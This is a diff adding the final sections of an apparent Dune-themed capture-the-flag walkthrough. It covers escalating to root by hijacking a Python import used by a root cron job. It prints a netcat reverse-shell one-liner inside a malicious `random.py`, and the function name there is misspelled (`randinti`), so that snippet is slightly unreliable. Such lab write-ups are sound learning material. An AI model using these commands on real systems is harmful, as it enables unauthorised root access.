@@ -272,6 +272,55 @@ print(f"The Fremen raid on the Harkonnens killed {num_harkonnens_killed} Harkonn
 
 It uses python's `random` module to generate a random integer from 1 to 100, then prints it. We can exploit this by adding our own malicious `random` module to execute whatever we wish. To do this, just create a file called `random.py` in the same directory as `raid-the-harkonnens.py` and add the `randint()` function to it. You can write to contents of the function to be whatever malicious code you want to add. Unfortunately this is only useful if we can run `python3` as a privileged user. The `python3` binary doesn't have the SUID bit set, and we can not use `sudo` to run the command. Let's try running `linpeas.sh` to see if we can find any other attack vectors.
 
+The first thing that jumps out at me is this cron job that gets run as `root`:
+
+```
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root	python3 /home/stilgar/raid-the-harkonnens.py
 ```
 
+Looks like `raid-the-harkonnens.py` gets run as `root` every minute! Now we can add our own malicious `random.py` module to get a reverse shell:
+
+```
+import os
+
+def randinti(a,b):
+    os.system("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <host-ip> <host-port> >/tmp/f")
+```
+Then in the next minute, we can catch a reverse shell.
+
+## 9. Root
+
+Let's check out the root directory.
+
+```
+# ls -l
+total 24
+-rwxr-xr-x 1 root root 18312 Jan 22 21:18 sardaukar
+```
+
+Looks like there is an executable file called `sardaukar`. Let's run it and see what happens.
+
+```
+# ./sardaukar
+ ____  _   _ _   _ _____ 
+|  _ \| | | | \ | | ____|
+| | | | | | |  \| |  _|  
+| |_| | |_| | |\  | |___ 
+|____/ \___/|_| \_|_____|
+                         
+
+EMPEROR: I yield! You've defeated my legions of Sardaukar warriors, and the Harkonnens are dead.
+You are the master of Arrakis, master of Dune, and now you are the Emperor.
+
+DUNE{NotTheFlag}
+
+
+
+Thank you for exploring DUNE. I hope you enjoyed the story and the challenges.
+The mystery of life isn't a problem to solve, but a reality to experience.
+-Frank Herbert
 ```
